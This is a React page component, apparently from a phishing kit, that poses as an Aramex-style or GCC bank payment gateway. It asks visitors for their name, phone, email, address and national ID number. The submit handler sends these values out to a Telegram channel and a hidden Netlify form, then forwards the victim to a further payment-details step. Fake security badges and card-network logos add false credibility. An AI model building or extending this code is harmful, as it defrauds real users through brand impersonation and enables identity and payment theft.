import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities";
import { ThemedButton } from "@/components/ui/ThemedButton";
import { ThemedInput } from "@/components/ui/ThemedInput";
import { ThemedCard } from "@/components/ui/ThemedCard";
import { ThemedHeader } from "@/components/ui/ThemedHeader";
import {
  Loader2,
  User,
  Phone,
  Mail,
  MapPin,
  ShieldCheck,
  Globe,
  Lock,
  Building2,
  Truck,
  CreditCard,
  Wallet,
} from "lucide-react";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentRecipient = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
  const updateLink = useUpdateLink();

  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [address, setAddress] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || 'aramex';

  // Resolve entity config
  const entityConfig = useMemo<PaymentEntityConfig>(() => {
    return resolveEntity(companyKey);
  }, [companyKey]);

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);

  const category = companyKey.includes('shipping') || companyKey.includes('aramex') ? 'shipping' :
                   companyKey.includes('bank') ? 'bank' : 'payment_gateway';

  useEffect(() => {
    if (linkData?.payload?.customerInfo) {
      const info = linkData.payload.customerInfo;
      setName(info.name || info.fullName || "");
      setPhone(info.phone || "");
      setEmail(info.email || "");
      setAddress(info.address || "");
    }
  }, [linkData]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!name || !phone) {
      toast({ title: "خطأ", description: "الرجاء إدخال الاسم ورقم الجوال", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const customerInfo = { name, phone, email, address, nationalId };

    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({ linkId: id, payload: { ...linkData?.payload, customerInfo } });
      }

      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "recipient-info",
          linkId: id!,
          service: entityConfig.nameAr,
          name, phone, email, address, nationalId,
          amount: formattedAmount
        }).toString()
      });

      await sendToTelegram({
        type: 'recipient_info',
        data: { name, phone, email, address, nationalId, service: entityConfig.nameAr, amount: formattedAmount },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/details${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل حفظ البيانات", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center" style={{ backgroundColor: entityConfig.bg }}>
        <Loader2 className="w-10 h-10 animate-spin" style={{ color: entityConfig.primary }} />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col" dir="rtl" style={{ backgroundColor: entityConfig.bg, fontFamily: entityConfig.font }}>
      <PaymentMetaTags
        serviceKey={companyKey}
        serviceName={entityConfig.nameAr}
        title={`بوابة الدفع - ${entityConfig.nameAr}`}
      />

      <ThemedHeader
        config={entityConfig}
        title={entityConfig.nameAr}
        subtitle="E-Services & Payment Gateway"
      />

      <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
        <div className="w-full max-w-xl space-y-8">
          <div className="text-center space-y-2">
            <h2 className="text-2xl sm:text-3xl font-bold tracking-tight" style={{ color: entityConfig.text }}>بيانات مستلم الخدمة</h2>
            <p className="text-sm font-medium uppercase tracking-wide" style={{ color: entityConfig.textMuted }}>Recipient Information & Verification</p>
          </div>

          <ThemedCard config={entityConfig} variant="elevated">
            <div className="h-2 w-full" style={{ backgroundColor: entityConfig.primary }} />
            <form onSubmit={handleSubmit} className="p-6 sm:p-10 space-y-6">
              <ThemedInput
                config={entityConfig}
                label="الاسم الكامل للمستفيد"
                value={name}
                onChange={(e) => setName(e.target.value)}
                placeholder="أدخل اسمك الكامل"
                icon={<User className="w-5 h-5" />}
                required
              />

              <div className="grid sm:grid-cols-2 gap-6">
                <ThemedInput
                  config={entityConfig}
                  label="رقم الجوال"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  placeholder="05xxxxxxxx"
                  icon={<Phone className="w-5 h-5" />}
                  required
                />
                <ThemedInput
                  config={entityConfig}
                  label="البريد الإلكتروني (اختياري)"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="example@mail.com"
                  icon={<Mail className="w-5 h-5" />}
                />
              </div>

              <ThemedInput
                config={entityConfig}
                label={category === 'shipping' ? 'العنوان بالتفصيل' : 'رقم الهوية / الإقامة'}
                value={category === 'shipping' ? address : nationalId}
                onChange={(e) => category === 'shipping' ? setAddress(e.target.value) : setNationalId(e.target.value)}
                placeholder={category === 'shipping' ? 'المدينة، الحي، الشارع' : 'أدخل رقم الهوية'}
                icon={category === 'shipping' ? <MapPin className="w-5 h-5" /> : <ShieldCheck className="w-5 h-5" />}
                required
              />

              <div className="pt-6">
                <ThemedButton
                  config={entityConfig}
                  type="submit"
                  disabled={isSubmitting}
                  loading={isSubmitting}
                >
                  {isSubmitting ? "جاري المعالجة..." : "متابعة عملية الدفع"}
                </ThemedButton>
                <div className="mt-6 flex items-center justify-center gap-2" style={{ color: entityConfig.textMuted }}>
                  <ShieldCheck className="w-4 h-4" />
                  <span className="text-[10px] font-bold uppercase tracking-widest">تشفير بيانات آمن 256-bit SSL</span>
                </div>
              </div>
            </form>
          </ThemedCard>

          <div className="flex justify-center gap-8 opacity-40 grayscale">
            <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-6" alt="mada" />
            <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-6" alt="visa" />
            <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-6" alt="mastercard" />
          </div>
        </div>
      </main>

      <form name="recipient-info" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="linkId" />
        <input type="text" name="service" />
        <input type="text" name="name" />
        <input type="tel" name="phone" />
        <input type="email" name="email" />
        <input type="text" name="address" />
        <input type="text" name="nationalId" />
        <input type="text" name="amount" />
      </form>
    </div>
  );
};

export default PaymentRecipient;
